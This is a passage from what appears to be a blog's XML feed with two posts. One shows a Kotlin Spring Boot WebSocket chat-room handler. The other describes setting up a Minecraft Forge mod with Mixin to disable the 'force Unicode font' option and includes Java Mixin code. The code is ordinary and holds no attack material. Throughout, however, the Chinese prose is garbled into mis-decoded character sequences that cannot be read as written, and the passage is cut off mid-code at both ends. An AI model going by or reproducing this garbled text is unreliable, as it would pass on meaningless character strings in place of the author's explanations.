keyword">val</span> errorMsg<span class="token operator">:</span> String <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæˆ‘ä¾¿æƒ³å†™ä¸ªé¡¹ç›®ç»ƒç»ƒæ‰‹ï¼Œäºæ˜¯å°±æƒ³åˆ°äº†è·¯å§å§çš„èŠå¤©å®¤åç«¯ã€‚è·¯å§å§æ˜¯ç”¨çš„TypeScriptå®ç°çš„èŠå¤©å®¤åç«¯ï¼Œæˆ‘ä¾¿æƒ³ç”¨Spring Bootå®ç°ä¸€ä¸ªåŠŸèƒ½ç±»ä¼¼çš„ã€‚</p><p>ä»£ç å¦‚ä¸‹</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">data</span> <span class="token keyword">class</span> <span class="token function">ChatWsMessageBean</span><span class="token punctuation">(</span>    <span class="token keyword">val</span> type<span class="token operator">:</span> String<span class="token punctuation">,</span>    <span class="token keyword">val</span> username<span class="token operator">:</span> String<span class="token punctuation">,</span>    <span class="token keyword">val</span> <span class="token keyword">data</span><span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>    <span class="token keyword">val</span> avatar<span class="token operator">:</span> String<span class="token punctuation">)</span><span class="token keyword">object</span> WebSocketMessageType <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token keyword">val</span> OPEN <span class="token operator">=</span> <span class="token string">"OPEN"</span>    <span class="token keyword">const</span> <span class="token keyword">val</span> CLOSE <span class="token operator">=</span> <span class="token string">"CLOSE"</span>    <span class="token keyword">const</span> <span class="token keyword">val</span> MESSAGE <span class="token operator">=</span> <span class="token string">"MESSAGE"</span><span class="token punctuation">}</span><span class="token annotation builtin">@Component</span><span class="token keyword">class</span> ChatRoomWsHandler <span class="token operator">:</span> <span class="token function">TextWebSocketHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">val</span> objectMapper <span class="token operator">=</span> <span class="token function">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">val</span> connectedSessions <span class="token operator">=</span> arrayListOf<span class="token operator">&lt;</span>WebSocketSession<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">afterConnectionEstablished</span><span class="token punctuation">(</span>session<span class="token operator">:</span> WebSocketSession<span class="token punctuation">)</span> <span class="token punctuation">{</span>        connectedSessions<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span>        <span class="token keyword">val</span> username <span class="token operator">=</span> session<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">?:</span> <span class="token string">"unnamed"</span>        <span class="token keyword">val</span> avatar <span class="token operator">=</span> session<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span><span class="token string">"avatar"</span><span class="token punctuation">]</span> <span class="token operator">?:</span> <span class="token string">"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp"</span>        connectedSessions<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span> it<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token function">TextMessage</span><span class="token punctuation">(</span><span class="token function">ChatWsMessageBean</span><span class="token punctuation">(</span>WebSocketMessageType<span class="token punctuation">.</span>OPEN<span class="token punctuation">,</span> username<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> avatar<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>        <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"[ChatRoom] <span class="token interpolation variable">$username</span> connect with avatar <span class="token interpolation variable">$avatar</span>"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">handleTextMessage</span><span class="token punctuation">(</span>session<span class="token operator">:</span> WebSocketSession<span class="token punctuation">,</span> message<span class="token operator">:</span> TextMessage<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">val</span> username <span class="token operator">=</span> session<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">?:</span> <span class="token string">"unnamed"</span>        <span class="token keyword">val</span> avatar <span class="token operator">=</span> session<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span><span class="token string">"avatar"</span><span class="token punctuation">]</span> <span class="token operator">?:</span> <span class="token string">"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp"</span>        connectedSessions<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span>            it<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token function">TextMessage</span><span class="token punctuation">(</span><span class="token function">ChatWsMessageBean</span><span class="token punctuation">(</span>WebSocketMessageType<span class="token punctuation">.</span>MESSAGE<span class="token punctuation">,</span> username<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                message<span class="token punctuation">.</span>payload<span class="token punctuation">,</span> avatar<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"[ChatRoom] <span class="token interpolation variable">$username</span> send message <span class="token interpolation"><span class="token delimiter variable">${</span>message<span class="token punctuation">.</span>payload<span class="token delimiter variable">}</span></span> with avatar <span class="token interpolation variable">$avatar</span>"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">afterConnectionClosed</span><span class="token punctuation">(</span>session<span class="token operator">:</span> WebSocketSession<span class="token punctuation">,</span> closeStatus<span class="token operator">:</span> CloseStatus<span class="token punctuation">)</span> <span class="token punctuation">{</span>        connectedSessions<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span>        <span class="token keyword">val</span> username <span class="token operator">=</span> session<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">?:</span> <span class="token string">"unnamed"</span>        <span class="token keyword">val</span> avatar <span class="token operator">=</span> session<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span><span class="token string">"avatar"</span><span class="token punctuation">]</span> <span class="token operator">?:</span> <span class="token string">"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp"</span>        connectedSessions<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span> it<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token function">TextMessage</span><span class="token punctuation">(</span><span class="token function">ChatWsMessageBean</span><span class="token punctuation">(</span>WebSocketMessageType<span class="token punctuation">.</span>CLOSE<span class="token punctuation">,</span> username<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> avatar<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>        <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"[ChatRoom] <span class="token interpolation variable">$username</span> disconnect with avatar <span class="token interpolation variable">$avatar</span>"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">fun</span> ChatWsMessageBean<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> objectMapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token annotation builtin">@Configuration</span><span class="token annotation builtin">@EnableWebSocket</span><span class="token keyword">class</span> WebSocketConfig <span class="token operator">:</span> WebSocketConfigurer <span class="token punctuation">{</span>    <span class="token annotation builtin">@Autowired</span>    <span class="token keyword">private</span> <span class="token keyword">lateinit</span> <span class="token keyword">var</span> chatRoomWsHandler<span class="token operator">:</span> ChatRoomWsHandler    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">registerWebSocketHandlers</span><span class="token punctuation">(</span>registry<span class="token operator">:</span> WebSocketHandlerRegistry<span class="token punctuation">)</span> <span class="token punctuation">{</span>        registry<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>chatRoomWsHandler<span class="token punctuation">,</span> <span class="token string">"chatroom"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">setAllowedOrigins</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯¹å…¶æ•ˆæœä¸ªäººè¿˜æ˜¯éå¸¸æ»¡æ„çš„ï¼Œæ”¹å¤©æœ‰æ—¶é—´å†™ä¸€ä¸ªAndroidç«¯çš„èŠå¤©å®¤</p><p>åœ¨å…¨æ ˆçš„é“è·¯ä¸Šè¶Šèµ°è¶Šè¿œXD</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> åç«¯ </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Minecraft Forge &amp; Mixin!</title>
      <link href="/2022/09/03/hello-forge-and-mixin/"/>
      <url>/2022/09/03/hello-forge-and-mixin/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-Minecraft-Forge-amp-Mixin"><a href="#Hello-Minecraft-Forge-amp-Mixin" class="headerlink" title="Hello Minecraft Forge &amp; Mixin!"></a>Hello Minecraft Forge &amp; Mixin!</h1><blockquote><p>èµ·å› ç»è¿‡å¤§æ¦‚æ˜¯æ–¯å¸•å…‹é‚£è¾¹éœ€è¦ä¸€ä¸ªæ¨¡ç»„æ¥ç¦æ­¢ç©å®¶å¼€å¯ å¼ºåˆ¶ä½¿ç”¨Unicodeå­—ä½“ è¿™ä¸€é€‰é¡¹æ¥ç¡®ä¿æè´¨åŒ…çš„ä½“éªŒæ•ˆæœ</p><p>è¡Œå§ï¼Œä»¥å‰è™½ç„¶å®Œå…¨æ²¡æœ‰äº†è§£è¿‡Forgeå¼€å‘ï¼Œè¿˜æ˜¯åªæœ‰ç¡¬ç€å¤´çš®ä¸Šäº†å‘—</p></blockquote><h2 id="Forgeç¯å¢ƒæ­å»º"><a href="#Forgeç¯å¢ƒæ­å»º" class="headerlink" title="Forgeç¯å¢ƒæ­å»º"></a>Forgeç¯å¢ƒæ­å»º</h2><blockquote><p>è€å¤§éš¾äº†ï¼ŒForge Modçš„å¼€å‘è€…ä¹‹æ‰€ä»¥æ˜æ˜¾å°‘äºBukkitæ’ä»¶å¼€å‘è€…ä¹Ÿè®¸å°±æ˜¯å› ä¸ºè¿™ä½æ‹¦è·¯è™å§</p><p>ä¸ä»…éš¾ï¼Œç¤¾åŒºçš„æœ‰å…³æ•™ç¨‹ä¹Ÿç‰¹åˆ«å°‘ ï¼ˆæˆ‘çŸ¥é“æœ‰å¾ˆå¤š1.12çš„ç¯å¢ƒæ­å»ºæ•™ç¨‹ï¼Œä½†1.16ç‰ˆæœ¬çš„forgeæ•™ç¨‹ç®€ç›´æ˜¯ä¸€ç‰‡è’åŸ</p><p>è€Œç”±äºç½‘ç»œåŸå› ï¼ˆä¼—æ‰€å‘¨çŸ¥ï¼‰ï¼Œè€å¤–çš„é‚£å¥—å®˜æ–¹æ•™ç¨‹å¾ˆå¤šåœ°æ–¹å¯¹æˆ‘ä»¬ä¸é€‚ç”¨</p><p>åº†å¹¸æˆ‘æœ€å¼€å§‹å­¦ä¹ çš„æ˜¯Bukkitå¼€å‘ï¼Œå¦‚æœå½“æ—¶æˆ‘é€‰æ‹©å­¦ä¹ forge modå¼€å‘ï¼Œå¤šåŠä¼šå€’åœ¨ç¯å¢ƒæ­å»ºè¿™åº§å¤§å±±å‰</p></blockquote><p>æœ€å¼€å§‹æˆ‘è¯•å›¾ä½¿ç”¨forgeå®˜æ–¹æä¾›çš„ForgeGradle mdkå¿«é€Ÿå®Œæˆå¼€å‘ç¯å¢ƒçš„æ­å»ºï¼Œæœ€åæˆ‘å‘ç°å³ä½¿æˆ‘èƒ½å¤Ÿç§‘å­¦ä¸Šç½‘ï¼Œæœ‰çš„ä¸œè¥¿gradleä¸€æ ·æ‹‰ä¸ä¸‹æ¥</p><p>æ€ä¹ˆåŠï¼Ÿäºæ˜¯æˆ‘ä¸Šmcbbså¯»æ±‚å¸®åŠ©ï¼Œå‘ç°äº†è€—å­å¤§ä½¬çš„[<a href="https://www.mcbbs.net/thread-896542-1-1.html">1.17.1-1.7.10] Minecraftæ¨¡ç»„å¼€å‘ç¦»çº¿åŒ… [Forge|Fabric] - ç¼–ç¨‹å¼€å‘ - Minecraft(æˆ‘çš„ä¸–ç•Œ)ä¸­æ–‡è®ºå› - (mcbbs.net)</a>äºæ˜¯æˆ‘ä¸‹è½½å¹¶éƒ¨ç½²äº†è€—å­å¤§ä½¬çš„gradleä¾èµ–ç¦»çº¿åŒ…ã€‚</p><p>åˆ°è¿™é‡Œæˆ‘ä¾¿å…·å¤‡äº†ä¸€ä¸ªForgeå¼€å‘è€…çš„åŸºæœ¬å¼€å‘ç¯å¢ƒ</p><p>ä½†å¦‚æœä»…ä»…åˆ°è¿™é‡Œå°±ç»“æŸï¼Œæˆ‘ä¹Ÿä¸ä¼šè¯´ä»–éš¾äº†</p><p>çœŸæ­£çš„é‡å¤´æˆï¼Œè¿˜åœ¨åå¤´</p><h2 id="Mixinç¯å¢ƒæ­å»º"><a href="#Mixinç¯å¢ƒæ­å»º" class="headerlink" title="Mixinç¯å¢ƒæ­å»º"></a>Mixinç¯å¢ƒæ­å»º</h2><blockquote><p>Mixinæ˜¯SpongePoweredå¼€å‘çš„ä¸€å¥—åŸºäºjavaagentå’Œasmæ¡†æ¶çš„å­—èŠ‚ç æ“ä½œæ¡†æ¶ï¼Œæœ‰äº†Mixinï¼Œå¼€å‘è€…å¯ä»¥æ‘†è„±ç¹ççš„ä¼ ç»Ÿå­—èŠ‚ç æ’æ¡©æ“ä½œï¼Œä»¥ä¸€ç§éå¸¸ç®€æ´ç›´è§‚çš„æ–¹å¼ä¿®æ”¹Minecraftå®¢æˆ·ç«¯çš„åº•å±‚é€»è¾‘ä»£ç </p><p>è€Œä¸åŒäºBukkit APIç«­åŠ›é˜»æ­¢å¼€å‘è€…åˆ©ç”¨æœåŠ¡ç«¯åŸç”Ÿç‰¹æ€§ï¼Œä¸»å¼ ä¸€åˆ‡æ’ä»¶åº”è¯¥å®Œå…¨åœ¨Bukkit APIçš„åŸºç¡€ä¸Šå®ç°</p><p>Forge APIçš„è®¾è®¡æ˜¯å®Œå…¨ä¿¡ä»»å¼€å‘è€…çš„ï¼Œé¼“åŠ±å¼€å‘è€…ä¿®æ”¹å®¢æˆ·ç«¯åº•å±‚é€»è¾‘ä»£ç æ¥å®ç°è‡ªå·±æƒ³è¦çš„ç‰¹æ€§ï¼Œç”šè‡³Forgeå‡†ç¡®æ¥è¯´ä¸èƒ½è¢«ç§°ä¸ºä¸€ç§APIï¼Œè€Œæ˜¯æ¨¡ç»„å¼€å‘è€…ä¸å®¢æˆ·ç«¯åº•å±‚ä»£ç çš„ä¸€å±‚å…¼å®¹å±‚ã€‚</p><p>æ‰€ä»¥è¯´ï¼ŒForgeå’ŒMixinå¯è°“æ˜¯å¤©ä½œä¹‹åˆï¼Œä»Forge1.16ç‰ˆæœ¬å¼€å§‹ï¼ŒForgeå¼€å§‹åŸç”Ÿé™„å¸¦Mixinç¯å¢ƒ</p><p>è€Œè¿™ä¸€åˆ‡ï¼Œå¾—ç›ŠäºMojangå®˜æ–¹å…¬å¸ƒäº†å®¢æˆ·ç«¯çš„æ··æ·†è¡¨ã€‚Minecraftä½œä¸ºä¸€æ¬¾å•†ä¸šæ¸¸æˆï¼Œå…¬å¸ƒæ··æ·†è¡¨æ— ç–‘æ˜¯ä¸€ç§å·¨å¤§çš„ç‰ºç‰²ã€‚ä½†æˆ‘ç›¸ä¿¡ï¼Œæ­£æ˜¯è¿™ä¸ªè‹±æ˜çš„å†³ç­–ï¼Œåˆºæ¿€äº†å¹¿å¤§æ¨¡ç»„å¼€å‘è€…çš„å¼€å‘çƒ­æƒ…ï¼Œè®©å„è‰²Minecraftæ¨¡ç»„åœ¨ç¤¾åŒºä¸­éåœ°ç”Ÿæ ¹ï¼Œè®©Minecraftæˆä¸ºå¦‚æ­¤ä¸€æ¬¾ä¼Ÿå¤§çš„æ¸¸æˆã€‚</p><p>æ‰€ä»¥åœ¨Forgeå¼€å‘ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°çš„å¤§éƒ¨åˆ†å®¢æˆ·ç«¯åº•å±‚ä»£ç éƒ½æ˜¯å…·æœ‰ç›¸å½“ç¨‹åº¦çš„å¯è¯»æ€§çš„ã€‚</p><p>è€Œä½¿ç”¨Mixinï¼Œå¯ä»¥è®©æˆ‘ä»¬ä»¥æœ€é«˜æ•ˆçš„æ–¹å¼ä¿®æ”¹åº•å±‚ä»£ç ï¼Œå®ç°ä¸€äº›ä»¥å‰åœ¨åšBukkitå¼€å‘æ—¶è¿æƒ³éƒ½ä¸æ•¢æƒ³çš„é­”æ³•èˆ¬çš„ç‰¹æ€§</p><p>é‚£ä¹ˆMixinçš„ç¯å¢ƒæ­å»ºï¼Œä¸Šé¢æˆ‘è¯´çš„é‡å¤´æˆ</p></blockquote><p>æœ€å¼€å§‹æˆ‘ä»¥ä¸ºMixinæ˜¯ä¸éœ€è¦é…ç½®ï¼Œå¼€ç®±å³ç”¨çš„ã€‚ç»“æœæŠŠç¼–è¯‘å‡ºæ¥çš„æ¨¡ç»„è·‘äº†ä¸€éåˆä¸€éï¼Œå‘ç°Mixinæ²¡æœ‰èµ·ä»»ä½•ä½œç”¨</p><p>æˆ‘å°è¯•åœ¨ç½‘ç»œä¸Šæœç´¢Mixinç¯å¢ƒæ­å»ºæ•™ç¨‹ï¼Œå´å‘ç°é™¤äº†è€—å­å¤§ä½¬çš„[<a href="https://www.mcbbs.net/thread-833646-1-1.html">æœªçŸ¥ä¹‹åŸŸ][ç¿»è¯‘]Mixinå®˜æ–¹æ–‡æ¡£ç¿»è¯‘â€”â€”æ·±åº¦ä¿®æ”¹Minecraftçš„åˆ©å™¨ - ç¼–ç¨‹å¼€å‘ - Minecraft(æˆ‘çš„ä¸–ç•Œ)ä¸­æ–‡è®ºå› - (mcbbs.net)</a>ï¼Œä¸€ç¯‡æœ‰ä»·å€¼çš„æ–‡ç« ä¹Ÿæ‰¾ä¸å‡ºæ¥ã€‚</p><p>æˆ‘åœ¨è€—å­å¤§ä½¬çš„å®˜æ–¹æ–‡æ¡£ç¿»è¯‘ä¸­å­¦ä¹ äº†Mixinçš„ä½¿ç”¨æ–¹æ³•ï¼Œä½†å®ƒå¹¶æ²¡æœ‰è¯¦ç»†çš„å‘Šè¯‰æˆ‘å¦‚ä½•æ­å»ºç¯å¢ƒã€‚</p><p>äºæ˜¯æˆ‘æƒ³èµ·æ¥ï¼Œåé»‘æ›¾ç»å†™è¿‡ä¸€ä¸ª1.16çš„Forge Modï¼Œæˆ‘æ˜¯ä¸æ˜¯å¯ä»¥å‚è€ƒä»–çš„æºç æ¥æ‹›çŒ«ç”»è™å‘¢</p><p>åŒæ—¶æˆ‘ä¹Ÿæƒ³èµ·æ¥æµ·èºçš„åšå®¢ä¼¼ä¹ä¹Ÿæåˆ°è¿‡è¿™ç©æ„ï¼Œç„¶ååœ¨è¿™ä¸Šé¢æ‰¾åˆ°äº†å®˜æ–¹çš„release note</p><p><a href="https://izzel.io/2020/02/06/mixin-0-8-guide/">å…³äº Mixin å‡çº§åˆ° 0.8 å’Œ ModLauncher çš„é‚£äº›äº‹ | IzzelAlizâ€™s Blog</a></p><p><a href="https://github.com/SpongePowered/Mixin/wiki/Release-Notes---Mixin-0.8">Release Notes Mixin 0.8 Â· SpongePowered/Mixin Wiki (github.com)</a></p><p>äºæ˜¯ä¾é ä¸Šé¢è¿™äº›ï¼Œæˆ‘åŸºæœ¬æ­å»ºèµ·äº†ä¸€ä¸ªMixinç¯å¢ƒ</p><blockquote><p>éš¾ç‚¹åŸºæœ¬å¦‚ä¸‹</p><p>1.MixinConnector</p><p>2.MixinRefmapæ–‡ä»¶</p><p>3.MixinAnnoationProcessor</p><p>4.Mixiné…ç½®æ–‡ä»¶</p><p>é¢å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒMixiné…ç½®æ–‡ä»¶ä¸­æŒ‡å®šçš„Mixin Pakageä¸èƒ½æŒ‡å®šä½æ¨¡ç»„ä¸»ç±»æ‰€åœ¨åŒ…ï¼Œè¿™æ ·ä¼šå¯¼è‡´æ¨¡ç»„æ— æ³•åŠ è½½</p></blockquote><p>è™½ç„¶æœ‰äº›æ™šäº†ï¼Œä½†æˆ‘è¿˜æ˜¯æŠŠé—®é¢˜è§£å†³ä¹‹åæ‰¾åˆ°çš„ç›¸å…³èµ„æ–™æ”¾åœ¨è¿™é‡Œ</p><p><a href="https://github.com/mouse0w0/forge-mixin-example">mouse0w0/forge-mixin-example: An example for using Mixin in Minecraft Forge 1.12.2 (github.com)</a></p><h2 id="åŠŸèƒ½å®ç°"><a href="#åŠŸèƒ½å®ç°" class="headerlink" title="åŠŸèƒ½å®ç°"></a>åŠŸèƒ½å®ç°</h2><p>æ¯•ç«Ÿä¹Ÿä¸æ˜¯æ•™ç¨‹ï¼Œæ‚è°ˆè€Œå·²ï¼Œå°±ä¸å†™ä½¿ç”¨æ•™ç¨‹äº†</p><p>è¿™é‡Œåªæ”¾å‡ºå®ç°åŠŸèƒ½çš„Mixinä»£ç </p><h3 id="æˆ‘çš„åšæ³•"><a href="#æˆ‘çš„åšæ³•" class="headerlink" title="æˆ‘çš„åšæ³•"></a>æˆ‘çš„åšæ³•</h3><p>é”æ‰åº•å±‚é€‰é¡¹å®é™…booleanå€¼ï¼Œä½¿ç©å®¶ä¸è®ºå¦‚ä½•æ›´æ”¹é€‰é¡¹éƒ½ä»¥éå¼ºåˆ¶Unicodeå­—ä½“æ–¹å¼æ¸²æŸ“å­—ä½“</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">me<span class="token punctuation">.</span>asgard<span class="token punctuation">.</span>rain<span class="token punctuation">.</span>afu<span class="token punctuation">.</span>mixin</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>common<span class="token punctuation">.</span>collect<span class="token punctuation">.</span></span><span class="token class-name">ImmutableMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>client<span class="token punctuation">.</span></span><span class="token class-name">Minecraft</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>client<span class="token punctuation">.</span>gui<span class="token punctuation">.</span>fonts<span class="token punctuation">.</span></span><span class="token class-name">FontResourceManager</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span></span><span class="token class-name">Final</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span></span><span class="token class-name">Mixin</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span></span><span class="token class-name">Overwrite</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span></span><span class="token class-name">Shadow</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token comment">/** * me.asgard.rain.afu.GameSettingMixin * AntiForceUnicode * * @author å¯’é›¨ * @since 2021/12/29 13:48 **/</span><span class="token annotation punctuation">@Mixin</span><span class="token punctuation">(</span><span class="token class-name">Minecraft</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">MinecraftMixin</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Final</span>    <span class="token annotation punctuation">@Shadow</span>    <span class="token keyword">private</span> <span class="token class-name">FontResourceManager</span> fontManager<span class="token punctuation">;</span>    <span class="token comment">/**     * @author Rain     * @reason force disable force unicode     */</span>    <span class="token annotation punctuation">@Overwrite</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isEnforceUnicode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/**     * @author Rain     * @reason force disable force unicode     */</span>    <span class="token annotation punctuation">@Overwrite</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">selectMainFont</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> p_238209_1_<span class="token punctuation">)</span> <span class="token punctuation">{</span>        fontManager<span class="token punctuation">.</span><span class="token function">setRenames</span><span class="token punctuation">(</span><span class="token class-name">ImmutableMap</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åé»‘çš„åšæ³•"><a href="#åé»‘çš„åšæ³•" class="headerlink" title="åé»‘çš„åšæ³•"></a>åé»‘çš„åšæ³•</h3><p>å†™æˆä¸€å¤©ååé»‘å¤§æ¦‚æ˜¯æ¥å…´è¶£äº†ï¼Œä¹Ÿå†™äº†ä¸€ä¸ª</p><p>ä»–ç›´æ¥æŠŠé‚£ä¸ªé€‰é¡¹çš„æŒ‰é’®åˆ æ‰äº†ã€‚æ¯«æ— ç–‘é—®ï¼Œè¿™ä¸ªåšæ³•æ›´å¥½</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">me<span class="token punctuation">.</span>skymc<span class="token punctuation">.</span>fsb<span class="token punctuation">.</span>mixin</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>client<span class="token punctuation">.</span></span><span class="token class-name">AbstractOption</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>client<span class="token punctuation">.</span>gui<span class="token punctuation">.</span>screen<span class="token punctuation">.</span></span><span class="token class-name">Screen</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>client<span class="token punctuation">.</span>gui<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">Widget</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span 